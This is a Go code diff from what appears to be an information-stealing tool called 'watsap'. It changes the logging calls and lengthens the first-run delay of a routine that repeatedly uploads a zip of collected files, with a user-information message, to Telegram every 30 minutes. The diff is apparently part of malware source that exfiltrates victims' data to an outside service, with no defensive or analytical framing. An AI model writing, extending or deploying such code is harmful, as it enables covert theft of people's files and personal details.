@@ -1,6 +1,7 @@
 package files
 
 import (
+	"log"
 	"time"
 	"watsap/utils/config"
 	"watsap/utils/files"
@@ -11,23 +12,23 @@ import (
 var zipFile = config.WaDir + "/files.zip"
 
 func SendFiles() {
-	config.Logger("SendFiles started", "debug")
+	log.Println("SendFiles started")
 	for {
 		err := telegram.TgSendFile(zipFile, messages.GetUserInfoMsg())
 		if err != nil {
-			config.Logger("[Files] Error sending file: "+err.Error(), "error")
+			log.Printf("[Files] Error sending file: %s", err.Error())
 		} else {
-			config.Logger("[Files] File Sent", "info")
+			log.Println("[Files] File Sent")
 		}
 		if config.DebugMode {
-			config.Logger("DebugMode is ON, sleeping for 5 seconds", "debug")
+			log.Println("DebugMode is ON, sleeping for 5 seconds")
 			time.Sleep(5 * time.Second)
 		} else {
 			if config.FirstRun {
-				config.Logger("FirstRun is true, sleeping for 1 second", "debug")
-				time.Sleep(1 * time.Second)
+				log.Println("FirstRun is true, sleeping for 10 minutes")
+				time.Sleep(10 * time.Minute)
 			} else {
-				config.Logger("Sleeping for 30 minutes", "debug")
+				log.Println("Sleeping for 30 minutes")
 				time.Sleep(30 * time.Minute)
 			}
 		}
@@ -35,11 +36,11 @@ func SendFiles() {
 }
 
 func CheckAndSendFiles() {
-	config.Logger("CheckAndSendFiles called", "debug")
+	log.Println("CheckAndSendFiles called")
 	if files.Exists(zipFile) {
-		config.Logger("zipFile exists, sending files", "debug")
+		log.Println("zipFile exists, sending files")
 		SendFiles()
 	} else {
-		config.Logger("[Files] File not found: "+zipFile, "error")
+		log.Printf("[Files] File not found: %s", zipFile)
 	}
 }
